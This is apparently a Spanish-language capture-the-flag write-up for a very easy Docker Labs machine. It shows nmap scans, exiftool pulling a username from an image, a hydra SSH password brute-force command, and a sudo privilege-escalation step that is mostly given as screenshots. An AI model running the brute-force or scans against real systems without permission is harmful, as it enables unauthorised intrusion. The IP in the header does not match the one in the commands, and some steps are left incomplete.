# >_ [Borazuwarah]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Docker Labs |
| **Dificultad** | 🟢 Muy Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.0.0.2` |
| **Fecha de resolución** | 2026-09-28 |

---

## 📝 Descripción

Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN allPorts
```

**Resultados del escaneo:**
* **Puerto 22/TCP**: SSH
* **Puerto 80/TCP**: HTTP

*Escaneo profundo de servicios:*
```bash
sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

| Puerto | Estado | Servicio | Versión |
| :---: | :---: | :--- | :--- |
| **22 / TCP** | 🟢 Abierto | SSH | OpenSSH 9.2p1 (Debian) |
| **80 / TCP** | 🟢 Abierto | HTTP | Apache httpd 2.4.59 |

Vemos que tenemos un sitio web y el puerto ssh pero no conocemos ninguna credencial así que empezamos revisando el sitio web.

### Enumeración Web (Puerto 80)
Al inspeccionar el sitio web, nos encontramos con la siguiente interfaz que solo contiene una imagen, nos la descargamos.
<img width="685" height="495" alt="3imagen" src="https://github.com/user-attachments/assets/d56ec4c4-6ce3-4647-85dd-b3d17498e054" />

💥 2. Fase de Explotación
```bash
exiftool imagen.jpeg
```

User: borazuwarah

```bash
hydra -l borazuwarah -P /usr/share/rockyou.txt ssh://172.17.0.2
```


👑 3. Escalada de Privilegios
Enumeración del Sistema
Ahora necesitamos escalar privilegios para ser root. Analizamos el entorno buscando vectores comunes de escalada y en id vemos ...

```bash
sudo -l
```

<img width="1227" height="239" alt="5escalar" src="https://github.com/user-attachments/assets/71eeb725-c5c7-4a00-aff2-be7e809a36eb" />

Somos el usuario root
<img width="586" height="102" alt="6root" src="https://github.com/user-attachments/assets/3ba3ad26-e2b2-455f-8ab4-3992ee5b73b9" />

